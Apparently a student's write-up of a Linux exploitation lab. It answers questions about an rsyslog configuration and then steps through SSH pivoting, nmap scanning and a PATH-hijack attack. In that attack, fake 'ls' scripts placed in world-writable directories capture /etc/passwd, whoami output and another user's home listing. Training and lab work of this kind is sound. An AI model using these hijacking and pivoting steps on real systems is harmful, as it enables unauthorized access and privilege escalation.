## LINUX EXPLOITATION NOTES ##



![Alt Text](linux_exploitation_images/image_01.png)

1. Using the contents of the "rsyslog2.conf" file as an example:

True/False: If this file were named /etc/rsyslog.conf, would the configuration be a concern for us if we gained accessed through secure shell?

To successfully answer the challenge, provide a T or F (capitalized)

T because while custom configuration data is in /etc/rsyslog.conf

2. Using the contents of the "rsyslog2.conf" file as an example:

Which rule will send a message to any logged in user?

To answer challenge successfully provide the facility.priority of the rule.

Example: mail.debug

*.emerg

# Everybody gets emergency messages

3. Using the "rsyslog2.conf" file.

Which active rule or rules is using a abnormal logging location?

To successfully complete the challenge provide the rule facility.priority.Example: mail.debug

local7.alert

#/var/log/wtmp(x) = Provides a permanent historical record of each time a user logged in and out, and system boots, reboots, and shutdowns in binary format.

4. Using the "rsyslog2.conf" file.

What priority level will user facility log?

To successfully complete the challenge provide the rule severity level.

![Alt Text](linux_exploitation_images/image_02.png)

0 = emergency

5. Using the "rsyslog2.conf" file.

Is remote logging enabled?To successfully complete the challenge provide a Y or N (capitalized)

Y # *.* @@192.0.2.1:13232 = this identifies all facilities and severity messages to a remote logging server

6. Using the "rsyslog2.conf" file.

What servers could this system send logs to? (also consider commented entries)

192.0.2.1 193.0.12.1 193.0.42.1

![Alt Text](linux_exploitation_images/image_03.png)

7. Using the "rsyslog2.conf" file.

What transport layer protocol does @@ utilize for communications when remote logging?

port 13232 == TCP

8. Using the "rsyslog2.conf" file.

Which rules are inactive, what are their facilities?

Rules has # making them inactive

![Alt Text](linux_exploitation_images/image_04.png)

9. There is a user on the system with the ability to sudo certain programs that has a '.' dot in their path and is navigating to and listing the contents of common world writable directories approximately every five minutes.

The user's script is running like this:

cd `printf "/var/tmp\n/tmp\n"|sort -R | head -n 1`;ls

The flag is located in this users home directory.

Step 1: Create a local Tunnel from lin-ops to Pivot (192.168.28.105)

student@lin-ops:~$ ssh student@10.50.33.231 -L 50511:192.168.28.105:2222 -NT

Step 2: Create a Dynamic to Pivot

student@lin-ops:~$ ssh comrade@localhost -p 50511 -D 9050 –NT

Step 3: Scan the target T1 for opem ports

student@lin-ops:~$ proxychains nmap -Pn 192.168.28.27 -p 1-5000

![Alt Text](linux_exploitation_images/image_05.png)

Step 4: Create a tunnel from lin-ops to T1

student@lin-ops:~$ ssh comrade@localhost -p 50511 -L 50522:192.168.28.27:22 -NT

Step 5: ssh to T1

student@lin-ops:~$ ssh comrade@localhost -p 50522

Step 6: Go to cd `printf "/var/tmp\n/tmp\n"|sort -R | head -n 1`;ls

![Alt Text](linux_exploitation_images/image_06.png)

Step 7: Here we are not able to read the files above. But the current user comrade@lin2 has “.” on directory which makes any script we put on that directory executable.

Create a Script:

`nano ls`

`!/bin/bash`

#script that sends information to a remote system.

`cat /etc/passwd > /tmp/test1.txt`

Here, this script is readin /etc/passwd and sending it to the /tmp directory to a file test2.txt

Do the same on /var/tmp direcotory as well

`nano ls`

Step 8: go back to /tmp directory and read the test1.txt file

![Alt Text](linux_exploitation_images/image_07.png)

Step 9: we need to identify who is running this scrip so change the nano ls on both directories

`nano ls`

`!/bin/bash`

#script that sends information to a remote system.

`whoami > /tmp/test1.txt`

And read the test1.txt file

![Alt Text](linux_exploitation_images/image_08.png)

Step 10: we know billybob is running the file

Step 11: Now, we need to figure out password for billybob -----

Nano

#!/bin/bash

# script that sends information to a remote system

/bin/ls /home/billybob > /tmp/test1.txt

Step 12: cat test1.txt

Note: watch “test1.txt” #this will run the file every 2 second

![Alt Text](linux_exploitation_images/image_09.png)

10. A command this user is able to sudo can be abused to obtain access as another user. This may take some research and effort to obtain root access with it.

It is possible that your initial user does not have sudo privileges and that you will need to move laterally to another account.

The flag can be found under the root profile directory